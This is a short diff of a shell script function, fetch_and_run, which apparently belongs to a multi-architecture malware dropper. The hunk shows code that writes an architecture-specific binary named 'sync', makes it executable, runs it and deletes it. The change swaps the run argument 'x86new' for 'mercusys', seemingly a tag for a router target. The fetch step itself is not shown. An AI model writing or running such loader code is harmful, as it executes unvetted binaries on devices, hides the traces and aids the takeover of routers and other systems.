@@ -21,7 +21,7 @@ fetch_and_run() {
         # Rename, make executable, and run with the specified argument
         cat "sync.$ARCH" > sync
         chmod +x sync
-        ./sync x86new
+        ./sync mercusys
         # Clean up before next attempt
         rm -f sync "sync.$ARCH"
         echo "Execution attempt for $ARCH finished."
